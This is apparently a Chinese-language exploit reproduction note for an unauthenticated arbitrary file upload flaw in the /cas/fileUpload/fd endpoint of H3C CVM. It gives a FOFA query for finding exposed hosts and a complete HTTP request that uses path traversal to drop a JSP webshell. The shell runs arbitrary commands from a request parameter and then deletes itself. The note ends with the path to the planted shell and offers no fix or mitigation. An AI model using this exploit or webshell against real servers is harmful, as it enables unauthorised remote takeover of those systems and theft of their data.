## H3C-CVM-fd接口前台任意文件上传漏洞复现

 H3C CVM /cas/fileUpload/fd 接口存在任意文件上传漏洞，未授权的攻击者可以上传任意文件，获取 webshell，控制服务器权限，读取敏感信息等。

## fofa

```javascript
app="H3C-CVM"
```

## poc

```javascript
POST /cas/fileUpload/fd HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.123 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=WebKitFormBoundaryMMqEBbEFHlzOcYq4
Connection: close

--WebKitFormBoundaryMMqEBbEFHlzOcYq4
Content-Disposition: form-data; name="token"

/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/a.jsp
--WebKitFormBoundaryMMqEBbEFHlzOcYq4
Content-Disposition: form-data; name="file"; filename="a.jsp"
Content-Type: image/png

<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b,0,a));}out.print("</pre>");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
--WebKitFormBoundaryMMqEBbEFHlzOcYq4--
```

![image-20241106171738287](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411061717362.png)

访问文件路径

```
/cas/js/lib/buttons/a.jsp
```